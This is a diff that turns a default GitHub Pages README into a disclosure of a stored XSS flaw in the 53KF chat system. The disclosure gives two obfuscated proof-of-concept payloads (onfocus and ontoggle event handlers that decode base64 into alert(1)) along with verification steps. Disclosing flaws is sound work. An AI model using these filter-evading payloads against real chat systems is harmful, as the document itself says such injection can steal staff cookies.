@@ -1,4 +1,4 @@
-## Welcome to GitHub Pages
+## 53KF_vuln_xss
 
 When using the 53KF online chat system, it is found that the inserted HTML statements can be successfully executed, and the alarm window and JS script can be executed successfully, thus stealing customer service staff cookies or fishing operations.
 
@@ -6,28 +6,26 @@ When using the 53KF online chat system, it is found that the inserted HTML state
 
 Cross Site Scripting (XSS) vulnerability in 53KF online chat system product, Affecting versions < 2.0.0.2 . The vulnerabilities could be remotely exploited resulting in Cross-Site Scripting (XSS) or information disclosure.
 
+Exploit Title: There is a stored Cross Site Scripting in 53KF
 
-# Header 1
-## Header 2
-### Header 3
+Date: 2020/10/27
 
-- Bulleted
-- List
+Exploit Author: panzhenhua
 
-1. Numbered
-2. List
+Vendor Homepage: http://www.53kf.me/
 
-**Bold** and _Italic_ and `Code` text
+Version: < 2.0.0.2
 
-[Link](url) and ![Image](https://github.com/i900008/panexiang.github.io/blob/gh-pages/2.png)
-```
+Tested on: macOS
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+## POC:
 
-### Jekyll Themes
+1、<input type=text autofocus onfocus=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))//
 
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/i900008/panexiang.github.io/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
+2、<details open ontoggle=window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))>
 
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+## verification
+Open 53 online customer service chat window to inject POC
+![Image](https://github.com/i900008/panexiang.github.io/blob/gh-pages/2.png
+Close the chat window and open it again. The attack is successful
+![Image](https://github.com/i900008/panexiang.github.io/blob/gh-pages/2.png
